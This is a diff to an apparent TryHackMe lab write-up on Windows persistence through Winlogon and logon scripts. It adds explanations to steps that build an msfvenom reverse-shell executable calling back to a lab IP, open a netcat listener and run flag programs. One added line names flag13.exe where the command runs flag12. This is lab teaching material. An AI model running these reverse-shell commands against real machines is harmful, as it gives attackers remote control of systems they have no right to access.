@@ -194,7 +194,7 @@ THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}
 
 # Winlogon
 1. Started up this task's machine
-2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine
+2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine to use Metasplout's msfvenom to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
 ```Bash
 root@ip-10-10-157-221:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.157.221 LPORT=9999 -f exe -o revshell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -282,7 +282,7 @@ Microsoft Windows [Version 10.0.17763.1821]
 
 C:\Windows\system32>
 ```
-11. `C:\flags\flags12.exe`
+11. `C:\flags\flags12.exe` from the reverse shell on our attack machine to run the **flag13.exe** program, which ended up containing this task's flag and displaying it onto our terminal
 ```PowerShell
 C:\Windows\system32>C:\flags\flag12.exe
 C:\flags\flag12.exe
@@ -294,7 +294,7 @@ THM{I_INSIST_GO_FIRST}
 
 # Logon Scripts
 1. Started up this task's machine
-2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine
+2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine to use Metasplout's msfvenom to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
 ```Bash
 root@ip-10-10-157-221:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.157.221 LPORT=9999 -f exe -o revshell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -304,7 +304,7 @@ Payload size: 460 bytes
 Final size of exe file: 7168 bytes
 Saved as: revshell.exe
 ```
-3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine
+3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for any inbound connections
 ```Bash
 root@ip-10-10-157-221:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
@@ -383,7 +383,7 @@ Microsoft Windows [Version 10.0.17763.1821]
 C:\Windows\system32>
 ```
 
-11. `C:\flags\flag13.exe`
+11. `C:\flags\flag13.exe` from the reverse shell on our attack machine to run the **flag13.exe** program, which ended up containing this task's flag and displaying it onto our terminal
 ```PowerShell
 C:\Windows\system32>C:\flags\flag13.exe
 C:\flags\flag13.exe
